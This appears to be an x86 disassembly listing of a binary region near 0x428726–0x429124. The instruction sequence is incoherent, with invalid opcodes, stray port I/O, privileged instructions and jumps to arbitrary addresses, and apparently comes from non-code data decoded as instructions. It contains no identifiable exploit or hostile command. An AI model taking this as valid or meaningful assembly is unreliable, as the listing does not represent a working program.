  428726:	jmp    0x1:0x70001af
  42872d:	add    BYTE PTR [ebx-0x799c65a6],ch
  428733:	ret    
  428734:	lods   al,BYTE PTR ds:[esi]
  428735:	stos   DWORD PTR es:[edi],eax
  428736:	sbb    dl,ch
  428738:	fbld   TBYTE PTR ds:0x4997ff99
  42873e:	mov    BYTE PTR [edi+0x5e],0x32
  428742:	sbb    DWORD PTR [edi-0x33c95a80],ecx
  428748:	xor    al,BYTE PTR [edi+0x37]
  42874b:	xlat   BYTE PTR ds:[ebx]
  42874c:	addr16 retf 0xbce
  428750:	sbb    edi,DWORD PTR [ebx-0x6d101c21]
  428756:	inc    edi
  428757:	mov    ecx,0xb7e1488f
  42875c:	shl    ecx,1
  42875e:	jge    0x428772
  428760:	sbb    DWORD PTR [eax+ebx*2],edi
  428763:	pop    esi
  428764:	aaa    
  428765:	dec    esi
  428766:	call   0x544bf4a5
  42876b:	pushf  
  42876c:	test   al,0x1f
  42876e:	xchg   ebp,eax
  42876f:	cmp    eax,0x9087a882
  428774:	std    
  428775:	add    eax,0xd07ddf4d
  42877a:	or     eax,0x1e546d35
  42877f:	cwde   
  428780:	xchg   dl,al
  428782:	sub    dh,0xd9
  428785:	pop    esp
  428786:	sahf   
  428787:	ins    BYTE PTR es:[edi],dx
  428788:	ror    BYTE PTR [edx+edi*2+0x3f],cl
  42878c:	or     dh,bh
  42878e:	dec    esi
  42878f:	test   al,0x3
  428791:	xlat   BYTE PTR ds:[ebx]
  428792:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428793:	and    al,0xbb
  428795:	ds add al,0x95
  428798:	mov    al,0x66
  42879a:	popa   
  42879b:	mov    esp,0x2897bb6a
  4287a0:	jecxz  0x428810
  4287a2:	out    dx,al
  4287a3:	cmp    bl,BYTE PTR [edi-0x34]
  4287a6:	fwait
  4287a7:	aam    0xd7
  4287a9:	add    ebp,DWORD PTR [ecx+0x716d48d6]
  4287af:	mov    eax,ds:0x4fb9dbc8
  4287b4:	jnp    0x428764
  4287b6:	sar    DWORD PTR [ecx],0x9d
  4287b9:	mov    edi,0x3cdc55d6
  4287be:	fcmovbe st,st(0)
  4287c0:	add    bh,BYTE PTR [edi+0x2f]
  4287c3:	pop    esi
  4287c4:	ss (bad) 
  4287c6:	shl    DWORD PTR [ebx],1
  4287c8:	cmp    dh,BYTE PTR [edi-0x5062ae4e]
  4287ce:	add    BYTE PTR [ecx+ebp*1+0x2d],ah
  4287d2:	jmp    0xaafefa2f
  4287d7:	xchg   ecx,eax
  4287d8:	mov    ebp,0x267c617a
  4287dd:	sbb    al,BYTE PTR [edi-0x25424421]
  4287e3:	mov    bl,0xe3
  4287e5:	or     BYTE PTR [edi+0x639f8cbb],dh
  4287eb:	and    DWORD PTR [edx-0x3f31a0dc],0xffffffd9
  4287f2:	mov    bl,0x47
  4287f4:	dec    edi
  4287f5:	popf   
  4287f6:	lahf   
  4287f7:	add    al,0x6
  4287f9:	in     eax,dx
  4287fa:	loop   0x428827
  4287fc:	sti    
  4287fd:	mov    dh,bh
  4287ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428800:	mov    al,ds:0x397cac00
  428805:	loope  0x42880d
  428807:	das    
  428808:	loope  0x428865
  42880a:	push   edi
  42880b:	or     ebx,esi
  42880d:	jge    0x4287b8
  42880f:	mov    al,ds:0xec645e30
  428814:	shrd   esi,edx,cl
  428817:	ror    BYTE PTR [ebx+0x4a14ab11],1
  42881d:	sahf   
  42881e:	aaa    
  42881f:	mov    cl,0x19
  428821:	cmp    eax,ebp
  428823:	imul   esp,DWORD PTR [eax-0x783ce245],0x64455ce9
  42882d:	xchg   edi,eax
  42882e:	ds test eax,0xb1af638d
  428834:	inc    BYTE PTR [eax]
	...
  428896:	es jp  0x42890a
  428899:	les    edi,FWORD PTR [ebp-0x31]
  42889c:	mov    bh,0xfa
  42889e:	ret    
  42889f:	ja     0x428848
  4288a1:	test   ebp,edi
  4288a3:	out    0x68,al
  4288a5:	das    
  4288a6:	icebp  
  4288a7:	mov    al,0x1
  4288a9:	add    BYTE PTR [edi],al
  4288ab:	add    DWORD PTR [eax],eax
  4288ad:	add    BYTE PTR [esi-0xcd84078],bh
  4288b3:	jbe    0x428930
  4288b5:	xchg   ecx,eax
  4288b6:	cld    
  4288b7:	adc    al,0x53
  4288b9:	jp     0x4288a9
  4288bb:	repz or eax,0xe703f606
  4288c1:	std    
  4288c2:	popa   
  4288c3:	cld    
  4288c4:	sahf   
  4288c5:	inc    ebp
  4288c6:	inc    ecx
  4288c7:	imul   edx,DWORD PTR [eax+0x2f],0x5d
  4288cb:	shr    BYTE PTR [eax+0xc17de72],0xc5
  4288d2:	jo     0x428863
  4288d4:	pop    ebp
  4288d5:	vpmadcswd xmm8,xmm2,xmm6,xmm1
  4288db:	mov    bh,bh
  4288dd:	addr16 inc ebx
  4288df:	nop
  4288e0:	out    0x3d,al
  4288e2:	xchg   ebx,eax
  4288e3:	nop
  4288e4:	retf   
  4288e5:	leave  
  4288e6:	inc    esi
  4288e7:	out    0x19,al
  4288e9:	inc    esi
  4288ea:	inc    eax
  4288eb:	pop    esp
  4288ec:	jmp    0x4288fc
  4288ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4288ef:	jle    0x428961
  4288f1:	aam    0xb2
  4288f3:	loope  0x4288a7
  4288f5:	xchg   esp,eax
  4288f6:	cmp    al,0x90
  4288f8:	call   0x282c2885
  4288fd:	adc    eax,0xefee8b09
  428902:	or     bh,al
  428904:	hlt    
  428905:	int    0xbf
  428907:	mov    BYTE PTR [ebx],0x93
  42890a:	sub    al,0x6f
  42890c:	jp     0x428901
  42890e:	retf   0x2bc0
  428911:	sub    DWORD PTR [ebp-0x57e010c0],ebx
  428917:	sbb    ch,al
  428919:	push   0x1f
  42891b:	add    BYTE PTR [edi+0x1b3af75a],bl
  428921:	mov    edx,0x96bd02ff
  428926:	mov    ebx,0x46cc8742
  42892b:	mov    eax,0xf3810ccb
  428930:	pop    ss
  428931:	shr    DWORD PTR [ebx],1
  428933:	push   esp
  428934:	sbb    DWORD PTR [ebx+0x4661e2ed],eax
  42893a:	out    0x40,al
  42893c:	push   edx
  42893d:	jmp    0xb613b631
  428942:	jns    0x42895b
  428944:	adc    al,0x43
  428946:	or     BYTE PTR [ebx-0x6d],dh
  428949:	add    DWORD PTR [eax],edi
  42894b:	ror    ah,cl
  42894d:	sbb    al,bh
  42894f:	outs   dx,DWORD PTR ds:[esi]
  428950:	add    dl,BYTE PTR [eax+ebx*1-0x2c]
  428954:	mov    ecx,0x582fd514
  428959:	pop    esi
  42895a:	out    0x24,eax
  42895c:	pop    ss
  42895d:	or     eax,0xe840fb06
  428962:	cli    
  428963:	stos   DWORD PTR es:[edi],eax
  428964:	hlt    
  428965:	icebp  
  428966:	aas    
  428967:	xchg   ebx,eax
  428968:	push   esp
  428969:	adc    bl,BYTE PTR [edx+0x68165959]
  42896f:	int    0xca
  428971:	cli    
  428972:	jp     0x42890c
  428974:	pop    esi
  428975:	xor    ch,BYTE PTR [ecx-0x74b4177d]
  42897b:	push   eax
  42897c:	jo     0x428936
  42897e:	hlt    
  42897f:	or     eax,0xc221de14
  428984:	inc    ecx
  428985:	pusha  
  428986:	mov    ch,0x43
  428988:	cmp    esi,DWORD PTR [ebp-0x42]
  42898b:	test   BYTE PTR [edi-0x22a99b64],bl
  428991:	pop    ss
  428992:	add    eax,DWORD PTR [ecx]
  428994:	jbe    0x428a02
  428996:	jge    0x428a05
  428998:	push   ebp
  428999:	inc    edi
  42899a:	push   ebp
  42899b:	jmp    0x40ef089d
  4289a0:	mov    ecx,0xa5647696
  4289a5:	mov    bh,0x4c
  4289a7:	mov    al,ds:0xdc775ca8
  4289ac:	in     eax,0x6
  4289ae:	js     0x428951
  4289b0:	and    bl,ah
  4289b2:	and    al,0x8e
  4289b4:	stos   DWORD PTR es:[edi],eax
	...
  428a15:	add    BYTE PTR [ebp+0xc],cl
  428a18:	clc    
  428a19:	pop    ebx
  428a1a:	stc    
  428a1b:	(bad)  
  428a1c:	out    dx,eax
  428a1d:	push   ds
  428a1e:	push   ss
  428a1f:	xchg   edx,eax
  428a20:	data16 aas 
  428a22:	jb     0x4289db
  428a24:	mov    dh,BYTE PTR [eax+edi*8+0x70001b1]
  428a2b:	add    DWORD PTR [eax],eax
  428a2d:	add    BYTE PTR [ecx],bl
  428a2f:	pop    eax
  428a30:	and    ah,al
  428a32:	sub    bh,BYTE PTR [esi]
  428a34:	call   0xcfe8:0x2dc7b3fe
  428a3b:	retf   
  428a3c:	in     al,0x69
  428a3e:	outs   dx,BYTE PTR ds:[esi]
  428a3f:	sbb    DWORD PTR [ebx+0x406221b6],edx
  428a45:	ins    DWORD PTR es:[edi],dx
  428a46:	ror    DWORD PTR [ebx-0x78],1
  428a49:	mov    ah,0xdf
  428a4b:	xchg   ebx,eax
  428a4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428a4d:	mov    ch,0x84
  428a4f:	sub    eax,0x84603e12
  428a54:	repnz or DWORD PTR [ebx-0x2563c55c],ecx
  428a5b:	retf   
  428a5c:	push   ebp
  428a5d:	push   cs
  428a5e:	pusha  
  428a5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428a60:	shl    BYTE PTR [ebx+ebx*2-0x260c759b],0x78
  428a68:	(bad)  
  428a69:	xor    ch,ch
  428a6b:	leave  
  428a6c:	idiv   DWORD PTR ds:0x6c725e96
  428a72:	or     DWORD PTR [eax-0x21],eax
  428a75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428a76:	lahf   
  428a77:	sahf   
  428a78:	jle    0x428aa7
  428a7a:	neg    DWORD PTR [ebx]
  428a7c:	inc    eax
  428a7d:	sbb    bl,dh
  428a7f:	or     eax,ebx
  428a81:	adc    BYTE PTR [edi+esi*2],dl
  428a84:	rcr    BYTE PTR [edx+0x30],cl
  428a87:	push   edi
  428a88:	mov    eax,0xae95681b
  428a8d:	adc    edx,edx
  428a8f:	adc    edi,DWORD PTR [ebx]
  428a91:	adc    DWORD PTR [ecx+0x62d90e76],ecx
  428a97:	sub    ebx,DWORD PTR [si]
  428a9a:	inc    ecx
  428a9b:	push   ds
  428a9c:	push   0xa4496f17
  428aa1:	stos   BYTE PTR es:[edi],al
  428aa2:	mov    al,0xc
  428aa4:	sbb    BYTE PTR [esi],dh
  428aa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428aa7:	sbb    ch,dl
  428aa9:	popf   
  428aaa:	sbb    ebx,0xb7a1814e
  428ab0:	jno    0x428b27
  428ab2:	inc    edi
  428ab3:	clc    
  428ab4:	jnp    0x428ac2
  428ab6:	mov    dl,0x1a
  428ab8:	push   ebx
  428ab9:	or     al,BYTE PTR [ebx-0x388b7a59]
  428abf:	(bad)  
  428ac1:	mov    dl,0x77
  428ac3:	(bad)  
  428ac4:	ror    BYTE PTR [edx-0x38],0xd2
  428ac8:	test   edi,eax
  428aca:	jo     0x428abc
  428acc:	fwait
  428acd:	loop   0x428b29
  428acf:	cmp    ah,dl
  428ad1:	ret    0x8b02
  428ad4:	push   ss
  428ad5:	adc    DWORD PTR [edi],0xffffffe1
  428ad8:	pop    edi
  428ad9:	and    BYTE PTR [edi+0x7f],dh
  428adc:	cmc    
  428add:	push   ecx
  428ade:	stos   DWORD PTR es:[edi],eax
  428adf:	inc    edx
  428ae0:	sti    
  428ae1:	fs mov al,0x4b
  428ae4:	mov    al,ds:0xfead579b
  428ae9:	test   al,0xd8
  428aeb:	push   edx
  428aec:	push   edi
  428aed:	imul   esp,DWORD PTR [esi+0x7c],0x46307e01
  428af4:	adc    DWORD PTR [ebx-0x7b],ebx
  428af7:	scas   ax,WORD PTR es:[edi]
  428af9:	cdq    
  428afa:	fistp  WORD PTR [ebx-0x2d84a405]
  428b00:	mov    ebp,0x972c6d25
  428b05:	adc    eax,0xb71db552
  428b0a:	pop    ebp
  428b0b:	ret    
  428b0c:	lahf   
  428b0d:	mov    ebx,0x77492881
  428b12:	push   cs
  428b13:	dec    edi
  428b14:	mov    dl,0xc1
  428b16:	adc    edi,DWORD PTR [eax+edx*8+0x4c]
  428b1a:	les    edi,FWORD PTR [ebp-0x17]
  428b1d:	mov    dl,BYTE PTR [ebx-0x57]
  428b20:	repnz mov DWORD PTR [eax],edi
  428b23:	dec    edi
  428b24:	cld    
  428b25:	ss dec esi
  428b27:	test   eax,0x3441f2a1
  428b2c:	sbb    esp,ebp
  428b2e:	gs jl  0x428ae6
  428b31:	ss jg  0x428b5a
  428b34:	pop    DWORD PTR [eax]
	...
  428b96:	lds    edx,FWORD PTR [ebp-0x76]
  428b99:	cli    
  428b9a:	call   0x5fb1:0xb77ff5ff
  428ba1:	test   eax,0x530344f9
  428ba6:	push   DWORD PTR [edx+0x1070001]
  428bac:	add    BYTE PTR [eax],al
  428bae:	sbb    eax,DWORD PTR [edx-0x6c]
  428bb1:	add    al,0x4a
  428bb3:	sahf   
  428bb4:	adc    al,bl
  428bb6:	out    dx,eax
  428bb7:	or     al,0x3d
  428bb9:	cmp    DWORD PTR [esi],eax
  428bbb:	dec    ebx
  428bbc:	jle    0x428c0e
  428bbe:	cmp    eax,0xccb0915c
  428bc3:	inc    edi
  428bc4:	mov    dl,0xc9
  428bc6:	(bad)  
  428bc8:	std    
  428bc9:	(bad)  
  428bca:	div    BYTE PTR [ecx+0x2c]
  428bcd:	ds and eax,0x89954789
  428bd3:	push   eax
  428bd4:	cmc    
  428bd5:	add    BYTE PTR [ecx-0x27],0x44
  428bd9:	shl    BYTE PTR [eax],1
  428bdb:	mov    ds:0xb34c795e,al
  428be0:	cmp    eax,esi
  428be2:	maxps  xmm1,XMMWORD PTR [eax+eax*1]
  428be6:	sub    ah,al
  428be8:	sbb    bh,BYTE PTR [ebp-0x439212a1]
  428bee:	or     edi,DWORD PTR [ecx+0x2aabb557]
  428bf4:	and    DWORD PTR [ebp+0x48],esp
  428bf7:	jmp    0x2abe1710
  428bfc:	fisttp WORD PTR [edi-0x3a5432be]
  428c02:	shl    DWORD PTR [ebx-0x2deb403d],1
  428c08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428c09:	fistp  DWORD PTR [edx+0x4e0983bc]
  428c10:	retf   0xfaa7
  428c13:	mov    ebp,0x9ac1dea9
  428c18:	es xchg ebx,eax
  428c1a:	mov    ch,0x43
  428c1c:	jmp    0xb99d:0x140fcbf1
  428c23:	bound  ebx,QWORD PTR [eax+0x8091976]
  428c29:	into   
  428c2a:	mov    BYTE PTR [ecx+0x1c],bh
  428c2d:	jmp    0x60c0e74c
  428c32:	out    0x11,al
  428c34:	das    
  428c35:	enter  0x69fd,0xd9
  428c39:	ror    DWORD PTR [edi+0x63],cl
  428c3c:	jle    0x428bfb
  428c3e:	rcr    DWORD PTR [eax+0x4b],0x75
  428c42:	aaa    
  428c43:	out    0xb2,al
  428c45:	inc    esp
  428c46:	xchg   esi,esp
  428c48:	dec    ebx
  428c49:	cdq    
  428c4a:	xchg   ebx,eax
  428c4b:	scas   eax,DWORD PTR es:[edi]
  428c4c:	mov    al,0x26
  428c4e:	xor    edx,DWORD PTR [eax+0x2e]
  428c51:	dec    ebx
  428c52:	daa    
  428c53:	je     0x428ca5
  428c55:	bound  ecx,QWORD PTR [ebx-0x2641c039]
  428c5b:	sti    
  428c5c:	call   0x1025b6c5
  428c61:	push   eax
  428c62:	pop    eax
  428c63:	xchg   edx,eax
  428c64:	pop    ecx
  428c65:	enter  0x127b,0xd7
  428c69:	xchg   ebx,eax
  428c6a:	arpl   WORD PTR [ebp-0x9],bx
  428c6d:	push   es
  428c6e:	jge    0x428c23
  428c70:	inc    eax
  428c71:	adc    DWORD PTR [eax+0x170eeaf8],ebx
  428c77:	sbb    eax,0x2574d523
  428c7c:	(bad)  
  428c7e:	test   ebp,edx
  428c80:	sub    al,0x8e
  428c82:	push   ds
  428c83:	ds mov edx,0x4a690986
  428c89:	loop   0x428c1d
  428c8b:	and    al,0x59
  428c8d:	out    dx,al
  428c8e:	inc    ecx
  428c8f:	fst    DWORD PTR [ebx]
  428c91:	add    BYTE PTR [ebx+esi*4-0x1a],0x3b
  428c96:	inc    edx
  428c97:	es jge 0x428c25
  428c9a:	pop    esi
  428c9b:	loopne 0x428c41
  428c9d:	or     ebp,eax
  428c9f:	fld    QWORD PTR [edx-0x7c]
  428ca2:	add    dh,BYTE PTR [esi+0x56]
  428ca5:	pop    es
  428ca6:	pop    ss
  428ca7:	loope  0x428c32
  428ca9:	xor    BYTE PTR [eax],dl
  428cab:	jp     0x428cd7
  428cad:	sbb    DWORD PTR [ebx],ebx
  428caf:	sub    eax,0xf84af291
  428cb4:	inc    edx
	...
  428d15:	add    BYTE PTR [ecx-0xace0e4b],al
  428d1b:	jne    0x428cde
  428d1d:	mov    ch,0x86
  428d1f:	xchg   esi,eax
  428d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428d21:	jns    0x428da2
  428d23:	pop    esi
  428d24:	adc    bl,BYTE PTR [esi+eax*1-0x4c]
  428d28:	add    DWORD PTR [eax],eax
  428d2a:	pop    es
  428d2b:	add    DWORD PTR [eax],eax
  428d2d:	add    BYTE PTR [ebx+0x5be6b73d],al
  428d33:	sub    cl,ah
  428d35:	(bad)  
  428d36:	mov    cl,bl
  428d38:	mov    dh,0xd
  428d3a:	mov    BYTE PTR [ebp-0xd8ae79],al
  428d40:	aam    0xea
  428d42:	add    dh,bl
  428d44:	xchg   DWORD PTR [edi],eax
  428d46:	dec    edi
  428d47:	or     al,0xf4
  428d49:	adc    DWORD PTR [ebx-0x35a88846],ebp
  428d4f:	sbb    al,0xe5
  428d51:	data16 jmp 0x428d9f
  428d54:	mov    edi,es
  428d56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428d57:	div    BYTE PTR [esi+0x5]
  428d5a:	fs push esi
  428d5c:	adc    al,0xe1
  428d5e:	sbb    BYTE PTR [esi+0x21],0x4d
  428d62:	sbb    esi,esi
  428d64:	inc    edi
  428d65:	inc    esp
  428d66:	test   esi,edx
  428d68:	cmp    DWORD PTR [eax],ecx
  428d6a:	adc    BYTE PTR [ebx-0x4f],bl
  428d6d:	idiv   edx
  428d6f:	and    dl,BYTE PTR [eax-0x60185691]
  428d75:	sbb    ah,BYTE PTR [ebp+0x6c]
  428d78:	sub    DWORD PTR [ecx+eax*4],esp
  428d7b:	inc    ecx
  428d7c:	outs   dx,BYTE PTR ds:[esi]
  428d7d:	and    BYTE PTR [eax],dl
  428d7f:	jge    0x428dd0
  428d81:	push   ds
  428d82:	adc    ecx,DWORD PTR [ebx]
  428d84:	mov    eax,0x656f16b7
  428d89:	mov    dh,0xb5
  428d8b:	pause  
  428d8d:	(bad)  
  428d8e:	dec    esp
  428d8f:	cmp    bl,cl
  428d91:	push   es
  428d92:	aaa    
  428d93:	stc    
  428d94:	sub    al,0x4b
  428d96:	sti    
  428d97:	ret    0xd06d
  428d9a:	pop    ebx
  428d9b:	mov    DWORD PTR [ecx-0x4144672a],ebx
  428da1:	aam    0xca
  428da3:	ss mov esp,0x5b9d6b9c
  428da9:	(bad)  
  428daa:	loop   0x428d91
  428dac:	sbb    DWORD PTR [eax+esi*2],edi
  428daf:	test   al,0x0
  428db1:	gs sti 
  428db3:	add    al,0x87
  428db5:	sbb    BYTE PTR [ebp+0x44d34ca0],dh
  428dbb:	scas   eax,DWORD PTR es:[edi]
  428dbc:	cld    
  428dbd:	arpl   WORD PTR [eax-0x6dce4844],sp
  428dc3:	push   esi
  428dc4:	push   esp
  428dc5:	cmc    
  428dc6:	shl    DWORD PTR [eax],0xef
  428dc9:	mov    esp,0xb2100769
  428dce:	dec    edx
  428dcf:	xor    edi,DWORD PTR [edx]
  428dd1:	mov    al,ds:0x81a9aa85
  428dd6:	push   es
  428dd7:	add    al,0xf5
  428dd9:	imul   edi,DWORD PTR [edx],0x3a46c2df
  428ddf:	ret    
  428de0:	test   cl,al
  428de2:	(bad)  [ecx+0xc]
  428de5:	pop    edi
  428de6:	sub    ah,BYTE PTR [ebp-0x6c8e1f96]
  428dec:	(bad)  
  428ded:	push   0x41
  428def:	jg     0x428e3b
  428df1:	inc    ebx
  428df2:	scas   al,BYTE PTR es:[edi]
  428df3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428df4:	stos   BYTE PTR es:[edi],al
  428df5:	jmp    0xb3515f37
  428dfa:	mov    al,0x92
  428dfc:	push   esi
  428dfd:	loope  0x428e66
  428dff:	sub    DWORD PTR [eax],edi
  428e01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428e02:	or     eax,0xac9fbab8
  428e07:	loope  0x428e2b
  428e09:	sbb    al,0x41
  428e0b:	stos   DWORD PTR es:[edi],eax
  428e0c:	ja     0x428e3a
  428e0e:	mov    edi,0x17ad3c28
  428e13:	inc    edi
  428e14:	adc    al,0xec
  428e16:	iret   
  428e17:	adc    ebx,DWORD PTR [ebx+0x6e3137f3]
  428e1d:	scas   al,BYTE PTR es:[edi]
  428e1e:	ja     0x428dcc
  428e20:	lea    ecx,[eax*8-0x7276059e]
  428e27:	pop    ecx
  428e28:	or     DWORD PTR [ebx],ebx
  428e2a:	mov    al,0x24
  428e2c:	mov    esp,esp
  428e2e:	adc    al,ah
  428e30:	adc    BYTE PTR [eax+0xc46f11],cl
	...
  428e96:	dec    edi
  428e97:	pop    ebp
  428e98:	pop    ecx
  428e99:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428e9d:	(bad)  
  428e9f:	cli    
  428ea0:	test   al,0xd9
  428ea2:	push   ecx
  428ea3:	cmp    al,0xa6
  428ea5:	cmp    cl,BYTE PTR ds:0x70001b5
  428eab:	add    DWORD PTR [eax],eax
  428ead:	add    BYTE PTR [edx+0x0],bh
  428eb0:	dec    ebp
  428eb1:	push   edi
  428eb2:	adc    esp,DWORD PTR [esi-0x58]
  428eb5:	mov    WORD PTR [edi-0x2c8bf5be],?
  428ebb:	push   ecx
  428ebc:	mov    edi,0xa0460658
  428ec1:	pop    ds
  428ec2:	push   esp
  428ec3:	xor    BYTE PTR [eax+esi*1],bl
  428ec6:	cli    
  428ec7:	mov    dl,0x5b
  428ec9:	and    ch,BYTE PTR [ebp+0x6ca80113]
  428ecf:	in     al,dx
  428ed0:	xor    DWORD PTR [ebx+0x3600340a],ecx
  428ed6:	in     eax,0xab
  428ed8:	xor    bh,al
  428eda:	or     BYTE PTR [edx+0x4c],cl
  428edd:	addr16 push eax
  428edf:	xchg   edi,eax
  428ee0:	(bad)  [ecx+edx*2+0x20]
  428ee4:	adc    edi,DWORD PTR [eax]
  428ee6:	stos   DWORD PTR es:[edi],eax
  428ee7:	test   BYTE PTR [eax-0x28497abe],dh
  428eed:	mov    edx,0x18584dac
  428ef2:	fstp   TBYTE PTR [eax+0x79169f86]
  428ef8:	xchg   edx,eax
  428ef9:	loop   0x428eb1
  428efb:	mov    es,WORD PTR [ebx-0x48]
  428efe:	sar    BYTE PTR [edx+ebx*8-0x3e68cb47],1
  428f05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428f06:	ja     0x428ef9
  428f08:	retf   0x664f
  428f0b:	test   eax,0xb2a5846
  428f10:	mov    dh,0x3a
  428f12:	inc    ebp
  428f13:	jb     0x428f3c
  428f15:	push   0xfffffff9
  428f17:	add    BYTE PTR [ecx],bh
  428f19:	adc    edi,ebp
  428f1b:	xor    ecx,edi
  428f1d:	and    eax,0xf7e9c2b4
  428f22:	sub    esp,0xffffffa6
  428f25:	into   
  428f26:	fwait
  428f27:	cld    
  428f28:	retf   
  428f29:	std    
  428f2a:	push   ebx
  428f2b:	dec    ebx
  428f2c:	test   bh,0xd3
  428f2f:	neg    BYTE PTR [eax]
  428f31:	add    ah,dh
  428f33:	pop    eax
  428f34:	outs   dx,BYTE PTR ds:[esi]
  428f35:	sub    al,0xa9
  428f37:	xchg   ebx,eax
  428f38:	mov    DWORD PTR [edi],edx
  428f3a:	leave  
  428f3b:	and    eax,ebp
  428f3d:	iret   
  428f3e:	xchg   ecx,eax
  428f3f:	mov    bl,0x81
  428f41:	mov    ecx,0x9d640da9
  428f46:	nop
  428f47:	imul   ebx,DWORD PTR es:[ecx+0xa],0x42ff7f4b
  428f4f:	out    dx,eax
  428f50:	ins    BYTE PTR es:[edi],dx
  428f51:	arpl   WORD PTR [esi-0xb],di
  428f54:	or     eax,0x9765cb0c
  428f59:	std    
  428f5a:	xchg   edi,eax
  428f5b:	dec    eax
  428f5c:	rcl    ecx,cl
  428f5e:	push   ss
  428f5f:	xor    eax,0x7d760ea1
  428f64:	or     eax,0x5a41c608
  428f69:	nop
  428f6a:	in     eax,0x90
  428f6c:	sub    BYTE PTR [edx-0x12],bh
  428f6f:	jae    0x428f17
  428f71:	sub    BYTE PTR [edi+edx*2-0x16],bh
  428f75:	aas    
  428f76:	jne    0x428fa6
  428f78:	mov    fs,ebx
  428f7a:	ins    DWORD PTR es:[edi],dx
  428f7b:	adc    DWORD PTR [ebx],esi
  428f7d:	mov    eax,ds:0x968060d4
  428f82:	adc    esi,DWORD PTR [eax]
  428f84:	lods   eax,DWORD PTR ds:[esi]
  428f85:	mov    eax,0x4e37407
  428f8a:	adc    bh,BYTE PTR ds:0xa8ee
  428f8f:	push   ebp
  428f90:	adc    ebp,DWORD PTR [ecx+0xb671d20]
  428f96:	fiadd  WORD PTR [edi+0x58]
  428f99:	jb     0x428ff0
  428f9b:	aas    
  428f9c:	test   BYTE PTR [ecx-0x54],dl
  428f9f:	(bad)  
  428fa0:	fcmove st,st(6)
  428fa2:	xlat   BYTE PTR ds:[ebx]
  428fa3:	or     bh,ah
  428fa5:	push   eax
  428fa6:	jg     0x428ff3
  428fa8:	jmp    0x428fc4
  428faa:	pop    edi
  428fab:	dec    edi
  428fac:	jmp    0x428f43
  428fae:	xor    edi,DWORD PTR [edx-0x63879e6c]
  428fb4:	and    eax,0x0
	...
  429015:	add    cl,ah
  429017:	in     al,dx
  429018:	mov    ebx,es
  42901a:	(bad)  
  42901b:	jecxz  0x42900c
  42901d:	out    dx,al
  42901e:	arpl   WORD PTR [esi+0x79],cx
  429021:	sbb    DWORD PTR [esi+0x147fd7ac],esi
  429027:	mov    dh,0x1
  429029:	add    BYTE PTR [edi],al
  42902b:	add    DWORD PTR [eax],eax
  42902d:	add    BYTE PTR [ebx],cl
  42902f:	add    DWORD PTR [ecx-0x6d],eax
  429032:	mov    dl,0xae
  429034:	arpl   bx,dx
  429036:	dec    edi
  429037:	or     bh,BYTE PTR [ecx+0x16d2d890]
  42903d:	mov    eax,ds
  42903f:	cmp    ebp,DWORD PTR [ecx]
  429041:	loop   0x429065
  429043:	push   ss
  429044:	jl     0x42901b
  429046:	test   DWORD PTR [edx+0x6dca5fb],ecx
  42904c:	jb     0x42900e
  42904e:	sbb    ecx,DWORD PTR [ebx]
  429050:	jle    0x429084
  429052:	xor    eax,0x761d9589
  429057:	add    eax,0xe8b962ca
  42905c:	pop    eax
  42905d:	sub    eax,0x15d106ec
  429062:	jmp    0xbe259ef1
  429067:	shr    DWORD PTR [ebx+edx*8-0x10beeb46],0x5a
  42906f:	mov    cl,BYTE PTR ds:[ebp+0x3f2c39e8]
  429076:	in     eax,0x25
  429078:	push   es
  429079:	(bad)  
  42907a:	push   ecx
  42907b:	push   ds
  42907c:	sub    ecx,DWORD PTR [edx+ebp*1-0xe]
  429080:	call   0x60ef:0xb5c89447
  429087:	inc    dx
  429089:	xor    bl,bl
  42908b:	das    
  42908c:	shl    BYTE PTR [edx-0xd],cl
  42908f:	test   DWORD PTR [edx],0xeeff261
  429095:	pop    ebx
  429096:	inc    ebx
  429097:	xchg   edi,eax
  429098:	ins    BYTE PTR es:[edi],dx
  429099:	xchg   ebx,eax
  42909a:	shl    DWORD PTR [esi+0x56],1
  42909d:	(bad)  
  42909e:	addr16 pop ebx
  4290a0:	adc    ecx,esp
  4290a2:	sbb    eax,0xb4c99870
  4290a7:	push   ebp
  4290a8:	xchg   edx,eax
  4290a9:	jge    0x4290b9
  4290ab:	or     cl,al
  4290ad:	adc    BYTE PTR ds:0x408bc41b,ah
  4290b3:	retf   0xff17
  4290b6:	rol    BYTE PTR [ebx*2-0x4e3d1cf2],0xd9
  4290be:	leave  
  4290bf:	test   eax,0x57581e02
  4290c4:	repnz mov ds:0x6739ebde,al
  4290ca:	sahf   
  4290cb:	adc    ah,BYTE PTR [ebx+edi*1+0x69]
  4290cf:	(bad)  
  4290d0:	mov    WORD PTR [edx],fs
  4290d2:	out    dx,al
  4290d3:	mov    ds:0xe7019837,eax
  4290d8:	hlt    
  4290d9:	cmp    eax,0x7a5ee8bf
  4290de:	call   0xf7010975
  4290e3:	push   eax
  4290e4:	(bad)  
  4290e5:	jmp    0xa404:0x7625f1a8
  4290ec:	xor    al,0xf1
  4290ee:	lock popf 
  4290f0:	jmp    0xafb1baf1
  4290f5:	jbe    0x429139
  4290f7:	mov    bl,0x73
  4290f9:	mov    bl,0x2c
  4290fb:	and    DWORD PTR [esi+esi*4-0x39],0x97a4b00
  429103:	pushf  
  429104:	mov    eax,ds:0xbf7a7870
  429109:	mov    edx,es
  42910b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42910c:	inc    ebx
  42910d:	push   ebp
  42910e:	cs mov esi,ebp
  429111:	sbb    DWORD PTR [ecx-0x3d],esp
  429114:	dec    edi
  429115:	mov    BYTE PTR [eax+0x368493e4],dl
  42911b:	adc    al,0x65
  42911d:	std    
  42911e:	das    
  42911f:	push   0xffffffc8
  429121:	es arpl bx,cx
  429124:	xchg   ecx,eax
